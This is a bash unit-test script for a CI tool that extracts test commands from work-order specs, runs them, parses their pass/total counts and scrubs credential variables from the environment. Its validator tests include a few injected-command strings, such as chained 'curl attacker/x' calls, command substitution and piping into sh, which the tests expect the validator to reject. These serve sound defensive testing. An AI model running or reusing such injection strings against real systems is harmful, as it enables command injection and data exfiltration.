#!/usr/bin/env bash
# run-stop-tests.sh -- unit tests for the run-stop-tests node core (rst_*) and the
# dependency-prep core (dprep_ensure_js_deps) in
# .archon/workflows/defaults/bdc-feature-development-codex.yaml and its byte-identical
# mirrors in the other 12 bdc-feature-development lanes.
#
# bdc-xo #1940 (harness defect 2026-09-05): the manifest "Tests:" line was stamped
# "N/A (required gates are reported separately)" on CODE WOs and the validator's test
# claim was never tied to an executed command. run-stop-tests executes the spec's
# declared test command in the run worktree and emits OBSERVED pass/total.
#
# Rather than re-typing that logic (which would drift), these tests EXTRACT the real
# core functions from the canonical YAML (awk range-match on the BEGIN/END markers)
# and exercise them against fixtures. A parity test asserts the core is byte-identical
# across all 13 lanes (this repo has no shared-include mechanism for workflow YAMLs).
# dprep_ensure_js_deps is called by prep-dependencies and by run-stop-tests. Both
# copies are extracted from the canonical YAML and parity-checked at each call site.
#
# Run: bash .archon/workflows/defaults/__tests__/run-stop-tests.sh
# Exits 0 on all-pass, 1 on any failure. ASCII only.

set -uo pipefail

FAIL=0
PASS=0

assert_eq() {
  local label="$1" expected="$2" actual="$3"
  if [ "$expected" = "$actual" ]; then
    PASS=$((PASS + 1)); echo "PASS: $label"
  else
    FAIL=$((FAIL + 1)); echo "FAIL: $label"; echo "  expected: [$expected]"; echo "  actual:   [$actual]"
  fi
}

assert_contains() {
  local label="$1" needle="$2" haystack="$3"
  if printf '%s\n' "$haystack" | grep -Fq "$needle"; then
    PASS=$((PASS + 1)); echo "PASS: $label"
  else
    FAIL=$((FAIL + 1)); echo "FAIL: $label"; echo "  needle:   $needle"; echo "  haystack: $haystack"
  fi
}

assert_not_contains() {
  local label="$1" needle="$2" haystack="$3"
  if printf '%s\n' "$haystack" | grep -Fq "$needle"; then
    FAIL=$((FAIL + 1)); echo "FAIL: $label"; echo "  needle present: $needle"
  else
    PASS=$((PASS + 1)); echo "PASS: $label"
  fi
}

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEFAULTS="$HERE/.."
export NODE_ENV=test
CANONICAL_YAML="$DEFAULTS/bdc-feature-development-codex.yaml"
LANES="
bdc-feature-development-astra.yaml
bdc-feature-development-codex-only.yaml
bdc-feature-development-codex.yaml
bdc-feature-development-cursor.yaml
bdc-feature-development-fable.yaml
bdc-feature-development-fusion-cx-kimi.yaml
bdc-feature-development-fusion-cx-qwen.yaml
bdc-feature-development-grok.yaml
bdc-feature-development-kimi-k3.yaml
bdc-feature-development-zero-claude.yaml
bdc-feature-development-zero-open.yaml
bdc-feature-development-zero.yaml
bdc-feature-development.yaml
"

extract_core() {
  # extract_core <yaml> <marker>  -> the bash between "# ---- BEGIN <marker> core" and
  # "# ---- END <marker> core", de-indented by the 6-space block-scalar indent.
  tr -d '\r' < "$1" | awk -v m="$2" '
    index($0, "# ---- BEGIN " m " core") { c = 1; next }
    index($0, "# ---- END " m " core") { c = 0 }
    c
  ' | sed 's/^      //'
}

extract_core_nth() {
  # extract_core_nth <yaml> <marker> <n>  -> the nth core body (1-based).
  # extract_core concatenates every match, so the two dprep copies are split here.
  tr -d '\r' < "$1" | awk -v m="$2" -v n="$3" '
    index($0, "# ---- BEGIN " m " core") { seen++; if (seen == n + 0) c = 1; next }
    index($0, "# ---- END " m " core") { if (c) { c = 0; exit } next }
    c
  ' | sed 's/^      //'
}

RST_CORE="$(extract_core "$CANONICAL_YAML" rst)"
if [ -z "$RST_CORE" ]; then
  echo "FATAL: could not extract rst core from $CANONICAL_YAML"; exit 1
fi
eval "$RST_CORE"

bind_worktree_runner() {
  WORKTREE_RUNNER="$(cd "$HERE/../../../.." && pwd)/packages/workflows/src/reliability/structured-evidence-runner.ts"
  WORKTREE_BUN="$(command -v bun)"
  ser_root() {
    if [ -f "$WORKTREE_RUNNER" ] && [ ! -L "$WORKTREE_RUNNER" ]; then
      printf '%s\n' "$WORKTREE_RUNNER"
      return 0
    fi
    return 1
  }
  ser_runner() {
    "$WORKTREE_BUN" "$WORKTREE_RUNNER" "$@"
  }
}
bind_worktree_runner
for fn in rst_class rst_extract_commands rst_command_looks_runnable rst_rescue_subdir rst_tests_in_diff rst_repo_test_script rst_parse_counts rst_scrub_env rst_run_commands rst_report; do
  if ! declare -F "$fn" >/dev/null; then echo "FATAL: $fn not defined after eval"; exit 1; fi
done

DPREP_CORE="$(extract_core_nth "$CANONICAL_YAML" dprep 1)"
if [ -z "$DPREP_CORE" ]; then
  echo "FATAL: could not extract dprep core from $CANONICAL_YAML"; exit 1
fi
if [ -n "$(extract_core_nth "$CANONICAL_YAML" dprep 3)" ]; then
  echo "FATAL: canonical yaml has more than 2 dprep cores"; exit 1
fi
eval "$DPREP_CORE"
if ! declare -F dprep_ensure_js_deps >/dev/null; then
  echo "FATAL: dprep_ensure_js_deps not defined after eval"; exit 1
fi

echo "--- Parity: rst core byte-identical across all 13 lanes ---"
for lane in $LANES; do
  assert_eq "parity $lane" "$RST_CORE" "$(extract_core "$DEFAULTS/$lane" rst)"
done

echo "--- Parity: dprep core byte-identical across all 13 lanes (2 occurrences each) ---"
for lane in $LANES; do
  assert_eq "dprep count $lane" "2" "$(grep -c 'BEGIN dprep core' "$DEFAULTS/$lane")"
  assert_eq "dprep occ1 $lane" "$DPREP_CORE" "$(extract_core_nth "$DEFAULTS/$lane" dprep 1)"
  assert_eq "dprep occ2 $lane" "$DPREP_CORE" "$(extract_core_nth "$DEFAULTS/$lane" dprep 2)"
  impl_dep="$(awk '
    $0 ~ /^  - id: implement$/ { hit = 1; next }
    hit && $0 ~ /^    depends_on:/ { print; exit }
    hit && $0 ~ /^  - id: / { exit }
  ' "$DEFAULTS/$lane")"
  assert_eq "implement depends_on $lane" "    depends_on: [prep-dependencies, repair-gate]" "$impl_dep"
done

echo "--- rst_class ---"
SPEC_M157='# WO-SHOPOPS-M157-CGC-DEALER-API-01

WO Class: CODE
target_repo: thinmansoftware/shopops

## 8. Stop conditions (CI-executable)

Stop 1a (grep assertion, new provider):
  grep -c "cgc-dealer-api" shopops-api/services/cert-lookup.js
  Expected: 1

Stop 2 (test suite):
  cd shopops-api && node tests/test_cgc_dealer_api.js && node tests/run_all.js --suite=m157
  Expected: all passing / 0 failing

Stop 2b (full suite):
  cd shopops-api && node tests/run_all.js

Stop 3 (ASCII scan):
  LC_ALL=C grep -n "[^ -~]" shopops-api/services/cert-lookup.js
  Expected: no output

## 9. Manifest requirements (CODE class)

Tests: <n>/<n> (cd shopops-api && node tests/test_cgc_dealer_api.js) and <n>/<n> (node tests/run_all.js)
'
assert_eq "CODE from 'WO Class: CODE'" "CODE" "$(printf '%s\n' "$SPEC_M157" | rst_class)"
assert_eq "MIXED from 'WO Class: MIXED'" "MIXED" "$(printf 'x\nWO Class: MIXED\n' | rst_class)"
assert_eq "DOCUMENTATION from fenced 'Class: DOCUMENTATION'" "DOCUMENTATION" "$(printf '```\nClass: DOCUMENTATION\n```\n' | rst_class)"
assert_eq "DOCS alias" "DOCUMENTATION" "$(printf 'WO Class: DOCS\n' | rst_class)"
assert_eq "default CODE when no class line" "CODE" "$(printf '# WO-X\n\nRung classification: feature\n' | rst_class)"
assert_eq "'Rung classification:' is not a class line" "CODE" "$(printf 'Rung classification: INFRA\n' | rst_class)"

echo "--- rst_extract_command ---"
assert_eq "Stop 2 (test suite) command wins" \
  "cd shopops-api && node tests/test_cgc_dealer_api.js && node tests/run_all.js --suite=m157" \
  "$(printf '%s\n' "$SPEC_M157" | rst_extract_commands | head -1)"
assert_eq "grep stop with 'tests' in its label is not a test block" \
  "bun test packages/x" \
  "$(printf 'Stop 1 (grep assertion, no secret in tests/fixtures):\n  grep -c x y\n  Expected: 0\n\nStop 2 (tests):\n  bun test packages/x\n  Expected: 3 passing\n' | rst_extract_commands | head -1)"
assert_eq "backslash continuation joins" \
  "cd apps/x && npm.cmd test -- --run a.test.ts b.test.ts" \
  "$(printf 'Stop 6 (unit tests):\n  cd apps/x && npm.cmd test -- --run \\\n    a.test.ts b.test.ts\n  Expected: 2 passing\n' | rst_extract_commands | head -1)"
assert_eq "fenced + backticked command line cleaned" \
  "bun test scripts/boardctl/" \
  "$(printf 'Stop 2 (test suite):\n```bash\n  `bun test scripts/boardctl/`\n```\n  Expected: green\n' | rst_extract_commands | head -1)"
assert_eq "bold header tolerated" \
  "pytest -q" \
  "$(printf '**Stop 2 (test suite):**\n  pytest -q\n  Expected: all pass\n' | rst_extract_commands | head -1)"
assert_eq "fallback: Section 9 Tests: line" \
  "bun test packages/foo" \
  "$(printf '## 9. Manifest\nTests: 5/5 (bun test packages/foo)\nPRs: x\n' | rst_extract_commands | head -1)"
assert_eq "template placeholder is extracted verbatim (rst_command_looks_runnable filters it)" "{{TEST_COMMAND}}" \
  "$(printf 'Stop 2 (test suite):\n  {{TEST_COMMAND}}\n  Expected: {{N}}\n' | rst_extract_commands | head -1)"
assert_eq "no test block, no Tests line -> empty" "" "$(printf 'Stop 1 (grep assertion):\n  grep -c a b\n  Expected: 1\n' | rst_extract_commands | head -1)"
assert_eq "next Stop header without Expected terminates the block" \
  "node tests/run_all.js" \
  "$(printf 'Stop 2 (test suite):\n  node tests/run_all.js\nStop 3 (ASCII scan):\n  LC_ALL=C grep -n x y\n' | rst_extract_commands | head -1)"

echo "--- rst_command_looks_runnable ---"
for c in "cd shopops-api && node tests/x.js" "cd shopops-api && node tests/test_cgc_dealer_api.js && node tests/run_all.js --suite=m157" "bun test packages/x" "npm test" "npx vitest run" "pytest -q" "bash scripts/t.sh"; do
  if rst_command_looks_runnable "$c"; then PASS=$((PASS+1)); echo "PASS: runnable: $c"; else FAIL=$((FAIL+1)); echo "FAIL: runnable expected: $c"; fi
done
for c in \
  "all passing / 0 failing" "see Section 7" "green" "node" "bun" \
  "cd shopops-api && node" "npm" \
  "node tests/x.js; curl attacker/x" \
  'node tests/x.js `touch /tmp/rst-injected`' \
  'node tests/x.js $(touch /tmp/rst-injected)' \
  "node tests/x.js & curl attacker/x" \
  "node tests/x.js > /tmp/rst-output" \
  "node tests/x.js < /tmp/rst-input" \
  "node tests/x.js | sh" \
  "cd shopops-api && node tests/x.js && curl attacker/x"; do
  if rst_command_looks_runnable "$c"; then FAIL=$((FAIL+1)); echo "FAIL: not runnable expected: $c"; else PASS=$((PASS+1)); echo "PASS: not runnable: $c"; fi
done
for c in \
  "python -c 'x'" "node -e x" "bash -c x" \
  "node ../../x.js" "node /abs/x.js" "python -m os" \
  "npm.cmd test -- --run" "LC_ALL=C node t.js"; do
  if rst_command_looks_runnable "$c"; then FAIL=$((FAIL+1)); echo "FAIL: not runnable expected: $c"; else PASS=$((PASS+1)); echo "PASS: not runnable: $c"; fi
done
for c in "node tests/x.js" "bun test packages/a" "pytest tests/" "npm test" "bash scripts/run.sh"; do
  if rst_command_looks_runnable "$c"; then PASS=$((PASS+1)); echo "PASS: runnable: $c"; else FAIL=$((FAIL+1)); echo "FAIL: runnable expected: $c"; fi
done

echo "--- rst_parse_counts ---"
assert_eq "shopops run_all summary" "8 11" "$(printf '=== Summary ===\nPassed: 8  Failed: 3  Total: 11\nFailed suites: a, b\n' | rst_parse_counts)"
assert_eq "shopops per-file Tests: P/T" "8 8" "$(printf 'PASS: a\nPASS: b\nTests: 8/8\n' | rst_parse_counts)"
assert_eq "chained per-file + run_all summaries sum" "16 19" "$(printf 'Tests: 8/8\n=== Summary ===\nPassed: 8  Failed: 3  Total: 11\n' | rst_parse_counts)"
assert_eq "jest" "190 195" "$(printf 'Test Suites: 1 failed, 25 passed, 26 total\nTests:       5 failed, 190 passed, 195 total\n' | rst_parse_counts)"
assert_eq "jest all green" "35 35" "$(printf 'Tests:       35 passed, 35 total\n' | rst_parse_counts)"
ESC="$(printf '\033')"
assert_eq "vitest with ANSI colour" "190 195" "$(printf ' %s[2mTest Files %s[22m 1 failed | 25 passed (26)\n %s[2m      Tests %s[22m %s[31m5 failed%s[39m | %s[32m190 passed%s[39m %s[90m(195)%s[39m\n' "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" | rst_parse_counts)"
assert_eq "vitest all green with skipped" "35 37" "$(printf '      Tests  35 passed | 2 skipped (37)\n' | rst_parse_counts)"
assert_eq "vitest all green plain" "12 12" "$(printf '      Tests  12 passed (12)\n' | rst_parse_counts)"
assert_eq "bun test" "4 5" "$(printf ' 4 pass\n 1 fail\n 9 expect() calls\nRan 5 tests across 1 file.\n' | rst_parse_counts)"
assert_eq "node:test (non-ASCII info glyph)" "4 4" "$(printf '\342\204\271 tests 4\n\342\204\271 pass 4\n\342\204\271 fail 0\n' | rst_parse_counts)"
assert_eq "TAP" "3 4" "$(printf 'ok 1 - a\nnot ok 2 - b\n# tests 4\n# pass 3\n# fail 1\n' | rst_parse_counts)"
assert_eq "mocha" "12 13" "$(printf '  12 passing (1s)\n  1 failing\n' | rst_parse_counts)"
assert_eq "pytest" "10 12" "$(printf '=================== 2 failed, 10 passed in 0.42s ===================\n' | rst_parse_counts)"
assert_eq "fallback PASS:/FAIL: lines" "6 8" "$(printf 'PASS: one\nPASS: two\nFAIL: three: boom\nPASS: four\nPASS: five\nFAIL: six\nPASS: seven\nPASS: eight\n' | rst_parse_counts)"
assert_eq "no recognisable output -> empty" "" "$(printf 'building...\ndone\n' | rst_parse_counts)"

echo "--- rst_report ---"
assert_eq "passed" "$(printf 'TESTS_STATUS=passed\nTESTS_LINE=27/27 (bun test x)')" "$(rst_report CODE 'bun test x' 0 '27 27')"
assert_eq "nonzero exit is failed even when counts agree" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=8/8 (node t.js) -- FAILED, exit 1')" "$(rst_report CODE 'node t.js' 1 '8 8')"
assert_eq "passed < total is failed" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=6/8 (node t.js) -- FAILED, exit 0')" "$(rst_report CODE 'node t.js' 0 '6 8')"
assert_eq "zero tests ran is failed" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=0/0 (node t.js) -- FAILED, exit 0')" "$(rst_report CODE 'node t.js' 0 '0 0')"
assert_eq "timeout exit 124 is failed" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=3/3 (node t.js) -- FAILED, exit 124')" "$(rst_report CODE 'node t.js' 124 '3 3')"
assert_contains "counts_unparsed" "TESTS_STATUS=counts_unparsed" "$(rst_report CODE 'node t.js' 0 '')"
assert_contains "counts_unparsed line is N/A with the command" "TESTS_LINE=N/A (test command exited 0 but pass/total could not be parsed from its output: node t.js)" "$(rst_report CODE 'node t.js' 0 '')"
assert_contains "CODE with no command is no_command_declared" "TESTS_STATUS=no_command_declared" "$(rst_report CODE '' 0 '')"
assert_contains "MIXED with no command is no_command_declared" "TESTS_STATUS=no_command_declared" "$(rst_report MIXED '' 0 '')"
assert_contains "INFRA with no command is not_required" "TESTS_STATUS=not_required" "$(rst_report INFRA '' 0 '')"
assert_contains "INFRA no-command line" "TESTS_LINE=N/A (INFRA class, no test command declared)" "$(rst_report INFRA '' 0 '')"

echo "--- integration: extract -> execute -> parse -> report in a temp worktree ---"
TMP="$(mktemp -d)"
cat > "$TMP/fake-tests.sh" <<'EOF'
#!/usr/bin/env bash
echo "PASS: alpha"
echo "PASS: beta"
echo "PASS: gamma"
echo "Tests: 3/3"
exit 0
EOF
SPEC_TMP="$(printf 'WO Class: CODE\n\nStop 2 (test suite):\n  bash ./fake-tests.sh\n  Expected: 3 passing / 3 total\n')"
CMD="$(printf '%s\n' "$SPEC_TMP" | rst_extract_commands | head -1)"
assert_eq "integration: command extracted" "bash ./fake-tests.sh" "$CMD"
( cd "$TMP" && timeout 60 bash -o pipefail -c "$CMD" > "$TMP/log" 2>&1 ); RC=$?
COUNTS="$(rst_parse_counts < "$TMP/log")"
assert_eq "integration: counts parsed from real execution" "3 3" "$COUNTS"
assert_eq "integration: report" "$(printf 'TESTS_STATUS=passed\nTESTS_LINE=3/3 (bash ./fake-tests.sh)')" "$(rst_report "$(printf '%s\n' "$SPEC_TMP" | rst_class)" "$CMD" "$RC" "$COUNTS")"
cat > "$TMP/fake-tests.sh" <<'EOF'
#!/usr/bin/env bash
echo "PASS: alpha"
echo "FAIL: beta: expected 2 got 1"
echo "Tests: 1/2"
exit 1
EOF
( cd "$TMP" && timeout 60 bash -o pipefail -c "$CMD" > "$TMP/log" 2>&1 ); RC=$?
assert_eq "integration: red suite reports failed with real numbers" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=1/2 (bash ./fake-tests.sh) -- FAILED, exit 1')" "$(rst_report CODE "$CMD" "$RC" "$(rst_parse_counts < "$TMP/log")")"
rm -rf "$TMP"

echo "--- rst_extract_commands: real spec shapes on bdc-xo main (2026-09-05 survey) ---"
SPEC_GCD='# WO-SHOPOPS-GCD-METADATA-TO-LISTING-01

WO Class: CODE

## 9. Stop conditions (CI-executable)

- `node tests/test_cover_resolver.js` exits 0 if that suite exists; otherwise
  state N/A and add a new suite that does.
- A new suite exists and exits 0: `node tests/test_gcd_metadata_passthrough.js`
- `grep -c "gcd" shopops-api/routes/store.js` returns 1 or greater.
- These pre-existing suites still exit 0: `node tests/test_cert_lookup.js`,
  `node tests/test_scan_to_list_cgc.js`.
- ASCII check on every touched file: `grep -nP "[^\x00-\x7F]"` returns nothing.

## 10. Manifest requirements

Manifest v2 in the PR body per global Rule 2.
'
OUT="$(printf '%s\n' "$SPEC_GCD" | rst_extract_commands)"
assert_eq "bullet-style stop section: four runner commands in document order" \
  "$(printf 'node tests/test_cover_resolver.js\nnode tests/test_gcd_metadata_passthrough.js\nnode tests/test_cert_lookup.js\nnode tests/test_scan_to_list_cgc.js')" "$OUT"

SPEC_GWT='# WO-SHOPOPS-CE-AUTH-CONTEXT-01

WO Class: CODE

## 7. Test scenarios

Test: /admin audit line
Given: alpha token, header bravo
When: GET /admin/ce-session -> 403
Then: one console line

## 12. Stop Point

Test: focused suite green
Given: fresh checkout of the PR head, `cd shopops-api && npm ci`
When: `node tests/test_auth_tenant_context.js`
Then: exit 0, summary line `Passed: N  Failed: 0` with N >= 60

Test: runner wiring
When: `node tests/run_all.js --suite=test_auth_tenant_context`
Then: exit 0 and the suite is listed (1 suite)

Test: legacy structural suite still green
When: `node tests/test_auth0_direct.js`
Then: exit 0

Test: consumers no longer read the raw header first
When: `grep -c "req.headers" shopops-api/routes/admin.js`
Then: 0
'
OUT="$(printf '%s\n' "$SPEC_GWT" | rst_extract_commands)"
assert_eq "Given/When/Then Stop Point: the three runner commands, npm ci and grep excluded" \
  "$(printf 'cd shopops-api && npm ci\nnode tests/test_auth_tenant_context.js\nnode tests/run_all.js --suite=test_auth_tenant_context\nnode tests/test_auth0_direct.js')" "$OUT"
if rst_command_looks_runnable "cd shopops-api && npm ci"; then FAIL=$((FAIL+1)); echo "FAIL: npm ci must not be runnable"; else PASS=$((PASS+1)); echo "PASS: npm ci is filtered as an install step"; fi
if rst_command_looks_runnable "bun install --frozen-lockfile"; then FAIL=$((FAIL+1)); echo "FAIL: bun install must not be runnable"; else PASS=$((PASS+1)); echo "PASS: bun install is filtered as an install step"; fi
if rst_command_looks_runnable "{{TEST_COMMAND}}"; then FAIL=$((FAIL+1)); echo "FAIL: placeholder must not be runnable"; else PASS=$((PASS+1)); echo "PASS: template placeholder is filtered"; fi

SPEC_PROSE='# WO-HARNESS-AUTO-REREVIEW-REPEAT-REASON-01

WO Class: CODE

## Stop conditions
Baseline on untouched tree: scenario 1 FAILS.
1. Given PR head, greps show the reason builder and its call site.
2. Test command exits 0 with scenarios 1-8 asserting values.
3. Runtime (Rule 19, after container rebuild under M-09).

## 12. Stop Point
Stops 1-3 evidenced; status:review; Captain CI closes.
'
assert_eq "prose-only stop section declares no command" "" "$(printf '%s\n' "$SPEC_PROSE" | rst_extract_commands)"
assert_eq "template block first, Section 9 duplicate deduped" \
  "$(printf 'bun test packages/foo\nbun test packages/bar')" \
  "$(printf 'Stop 2 (test suite):\n  bun test packages/foo\n  Expected: 3 passing\n\n## Stop conditions\n- `bun test packages/bar` exits 0\n\nTests: 3/3 (bun test packages/foo)\n' | rst_extract_commands)"
assert_eq "cap at 8 commands" "8" "$(for i in 1 2 3 4 5 6 7 8 9 10; do printf -- '## Stop conditions\n- `node tests/t%s.js` exits 0\n' "$i"; done | rst_extract_commands | grep -c .)"

echo "--- rst_rescue_subdir ---"
TMP="$(mktemp -d)"
mkdir -p "$TMP/shopops-api/tests" "$TMP/docs" "$TMP/node_modules/x/tests"
printf 'x' > "$TMP/shopops-api/tests/test_x.js"
printf 'x' > "$TMP/node_modules/x/tests/test_x.js"
assert_eq "node tests/x.js rescued into the only depth-1 dir that has it" "cd shopops-api && node tests/test_x.js" "$(cd "$TMP" && rst_rescue_subdir 'node tests/test_x.js')"
assert_eq "already cd-prefixed command untouched" "cd shopops-api && node tests/test_x.js" "$(cd "$TMP" && rst_rescue_subdir 'cd shopops-api && node tests/test_x.js')"
assert_eq "path that exists at root untouched" "bun test shopops-api/tests/test_x.js" "$(cd "$TMP" && rst_rescue_subdir 'bun test shopops-api/tests/test_x.js')"
assert_eq "path found nowhere untouched" "node tests/nope.js" "$(cd "$TMP" && rst_rescue_subdir 'node tests/nope.js')"
mkdir -p "$TMP/other/tests" && printf 'x' > "$TMP/other/tests/test_x.js"
assert_eq "ambiguous (two candidate dirs) untouched" "node tests/test_x.js" "$(cd "$TMP" && rst_rescue_subdir 'node tests/test_x.js')"
rm -rf "$TMP"

echo "--- rst_tests_in_diff (temp git repo) ---"
TMP="$(mktemp -d)"
(
  cd "$TMP" && git init -q . && git config user.email t@t && git config user.name t
  mkdir -p src shopops-api/tests/fixtures shopops-api/tests/helpers packages/x/src tests/helpers
  printf 'base\n' > src/a.ts && printf '{}\n' > bun.lock && printf '{"name":"x"}\n' > package.json
  git add -A && git commit -qm base
  BASE="$(git rev-parse HEAD)"
  printf 'changed\n' > src/a.ts
  printf 't\n' > packages/x/src/a.test.ts
  printf 't\n' > shopops-api/tests/test_b.js
  printf '{}\n' > shopops-api/tests/fixtures/f.json
  printf 'h\n' > shopops-api/tests/helpers/h.js
  printf 'h\n' > tests/helpers/h.js
  printf 'r\n' > shopops-api/tests/run_all.js
  printf 'u\n' > shopops-api/tests/_harness.js
  printf 's\n' > tests/test_validate_prior_art_evidence.sh
  git add -A && git commit -qm change
  mkdir -p packages/y && printf 'u\n' > packages/y/z.spec.ts
  rst_tests_in_diff "$BASE" > "$TMP/out1"
  printf '{"name":"x","devDependencies":{"vitest":"^2"}}\n' > package.json
  rst_tests_in_diff "$BASE" > "$TMP/out2"
  git checkout -q -- . 2>/dev/null; rm -f packages/y/z.spec.ts
  rst_tests_in_diff HEAD > "$TMP/out3"
)
assert_eq "bun runner groups committed + untracked test files; bash test at root; fixtures/helpers/run_all/_harness/src excluded" \
  "$(printf 'cd shopops-api && node tests/test_b.js\nbash tests/test_validate_prior_art_evidence.sh\nbun test packages/x/src/a.test.ts packages/y/z.spec.ts')" "$(cat "$TMP/out1")"
assert_contains "vitest declared in package.json -> npx vitest run" "npx vitest run packages/x/src/a.test.ts packages/y/z.spec.ts" "$(cat "$TMP/out2")"
assert_eq "no test files in diff -> empty" "" "$(cat "$TMP/out3")"
rm -rf "$TMP"

echo "--- rst_repo_test_script (last rung) ---"
TMP="$(mktemp -d)"
assert_eq "no package.json -> empty" "" "$(cd "$TMP" && rst_repo_test_script)"
printf '{"name":"x","scripts":{"build":"tsc"}}\n' > "$TMP/package.json"
assert_eq "package.json without a test script -> empty" "" "$(cd "$TMP" && rst_repo_test_script)"
printf '{"name":"x","scripts":{"test":"vitest run"}}\n' > "$TMP/package.json"
assert_eq "test script, no bun lockfile -> npm test" "npm test" "$(cd "$TMP" && rst_repo_test_script)"
printf '{}\n' > "$TMP/bun.lock"
assert_eq "test script + bun.lock -> bun run test" "bun run test" "$(cd "$TMP" && rst_repo_test_script)"
rm -rf "$TMP"

echo "--- rst_run_commands: two commands, counts summed, first nonzero exit kept ---"
export OVERSEER_FOO=production-shaped-test-value
export MERGE_MANAGER_GH_TOKEN=production-shaped-test-value
export BOARD_PRINCIPALS_JSON=production-shaped-test-value
export GH_TOKEN=production-shaped-test-value
export DISPATCH_POSTGRES_PHASE15_TEST_URL=postgresql://localhost/phase15
rst_scrub_env
assert_eq "scrub removes OVERSEER_ prefix" "unset" "${OVERSEER_FOO:-unset}"
assert_eq "scrub removes MERGE_MANAGER_ prefix" "unset" "${MERGE_MANAGER_GH_TOKEN:-unset}"
assert_eq "scrub removes BOARD_ prefix" "unset" "${BOARD_PRINCIPALS_JSON:-unset}"
assert_eq "scrub removes exact GH_TOKEN" "unset" "${GH_TOKEN:-unset}"
assert_eq "scrub preserves disposable test fixtures" "postgresql://localhost/phase15" "${DISPATCH_POSTGRES_PHASE15_TEST_URL:-unset}"
echo "--- telegram operational names are scrubbed; fixtures and runtime basics remain ---"
T2_SNAP="$(
  export TELEGRAM_BOT_TOKEN=production-shaped-test-value
  export TELEGRAM_STREAMING_MODE=production-shaped-test-value
  export TELEGRAM_APPROVAL_CHAT_ID=production-shaped-test-value
  export TELEGRAM_ALLOWED_USER_IDS=production-shaped-test-value
  export TELEGRAM_TEST_FIXTURE=fixture-value
  export DISPATCH_POSTGRES_PHASE15_TEST_URL=postgresql://localhost/phase15
  path_before="$PATH"
  home_before="$HOME"
  rst_scrub_env
  printf 'BOT=%s\n' "${TELEGRAM_BOT_TOKEN-unset}"
  printf 'MODE=%s\n' "${TELEGRAM_STREAMING_MODE-unset}"
  printf 'CHAT=%s\n' "${TELEGRAM_APPROVAL_CHAT_ID-unset}"
  printf 'USERS=%s\n' "${TELEGRAM_ALLOWED_USER_IDS-unset}"
  printf 'FIX=%s\n' "${TELEGRAM_TEST_FIXTURE-unset}"
  printf 'URL=%s\n' "${DISPATCH_POSTGRES_PHASE15_TEST_URL-unset}"
  if [ "$PATH" = "$path_before" ]; then printf 'PATH=same\n'; else printf 'PATH=changed\n'; fi
  if [ "$HOME" = "$home_before" ]; then printf 'HOME=same\n'; else printf 'HOME=changed\n'; fi
)"
assert_eq "t2 TELEGRAM_BOT_TOKEN removed" "BOT=unset" "$(printf '%s\n' "$T2_SNAP" | sed -n '1p')"
assert_eq "t2 TELEGRAM_STREAMING_MODE removed" "MODE=unset" "$(printf '%s\n' "$T2_SNAP" | sed -n '2p')"
assert_eq "t2 TELEGRAM_APPROVAL_CHAT_ID removed" "CHAT=unset" "$(printf '%s\n' "$T2_SNAP" | sed -n '3p')"
assert_eq "t2 TELEGRAM_ALLOWED_USER_IDS removed" "USERS=unset" "$(printf '%s\n' "$T2_SNAP" | sed -n '4p')"
assert_eq "t2 TELEGRAM_TEST_FIXTURE kept" "FIX=fixture-value" "$(printf '%s\n' "$T2_SNAP" | sed -n '5p')"
assert_eq "t2 DISPATCH test url kept" "URL=postgresql://localhost/phase15" "$(printf '%s\n' "$T2_SNAP" | sed -n '6p')"
assert_eq "t2 PATH kept" "PATH=same" "$(printf '%s\n' "$T2_SNAP" | sed -n '7p')"
assert_eq "t2 HOME kept" "HOME=same" "$(printf '%s\n' "$T2_SNAP" | sed -n '8p')"
TMP="$(mktemp -d)"
cat > "$TMP/ok.sh" <<'EOF'
#!/usr/bin/env bash
echo "Tests: 3/3"
EOF
cat > "$TMP/red.sh" <<'EOF'
#!/usr/bin/env bash
echo " 4 pass"
echo " 1 fail"
exit 1
EOF
printf 'bash ./ok.sh\nbash ./red.sh\n' > "$TMP/cmds"
assert_eq "exit 1, 7 passed of 8" "1 7 8" "$(cd "$TMP" && rst_run_commands ./cmds ./log)"
assert_contains "log carries per-command headers" "### run-stop-tests: bash ./red.sh" "$(cat "$TMP/log")"
assert_contains "log carries per-command exit" "### exit 1" "$(cat "$TMP/log")"
printf 'bash ./ok.sh\n' > "$TMP/cmds"
assert_eq "single green command" "0 3 3" "$(cd "$TMP" && rst_run_commands ./cmds ./log2)"
printf 'exit 0\n' > "$TMP/silent.sh"
printf 'bash ./silent.sh\n' > "$TMP/cmds"
assert_eq "no counts parsed -> exit only" "0  " "$(cd "$TMP" && rst_run_commands ./cmds ./log3)"
rm -rf "$TMP"

echo "--- dprep_ensure_js_deps and npx/npm translation ---"
ORIG_PATH="$PATH"
BIN="$(mktemp -d)"
REC="$BIN/argv.txt"
ENVREC="$BIN/env.txt"

echo "--- test 1: bun worktree without node_modules installs ---"
cat > "$BIN/bun" <<EOF
#!/usr/bin/env bash
printf '%s\\n' "\$*" >> "$REC"
printf 'GH_TOKEN=%s\\n' "\${GH_TOKEN-unset}" >> "$ENVREC"
printf 'TEST_URL=%s\\n' "\${DISPATCH_POSTGRES_PHASE15_TEST_URL-unset}" >> "$ENVREC"
printf 'BOT=%s\\n' "\${TELEGRAM_BOT_TOKEN-unset}" >> "$ENVREC"
printf 'MODE=%s\\n' "\${TELEGRAM_STREAMING_MODE-unset}" >> "$ENVREC"
printf 'CHAT=%s\\n' "\${TELEGRAM_APPROVAL_CHAT_ID-unset}" >> "$ENVREC"
printf 'USERS=%s\\n' "\${TELEGRAM_ALLOWED_USER_IDS-unset}" >> "$ENVREC"
printf 'FIX=%s\\n' "\${TELEGRAM_TEST_FIXTURE-unset}" >> "$ENVREC"
mkdir -p node_modules
EOF
chmod +x "$BIN/bun"
export PATH="$BIN:/usr/bin:/bin"
export GH_TOKEN=production-shaped-test-value
export DISPATCH_POSTGRES_PHASE15_TEST_URL=postgresql://localhost/phase15
export TELEGRAM_BOT_TOKEN=production-shaped-test-value
export TELEGRAM_STREAMING_MODE=production-shaped-test-value
export TELEGRAM_APPROVAL_CHAT_ID=production-shaped-test-value
export TELEGRAM_ALLOWED_USER_IDS=production-shaped-test-value
export TELEGRAM_TEST_FIXTURE=fixture-value
TMP="$(mktemp -d)"
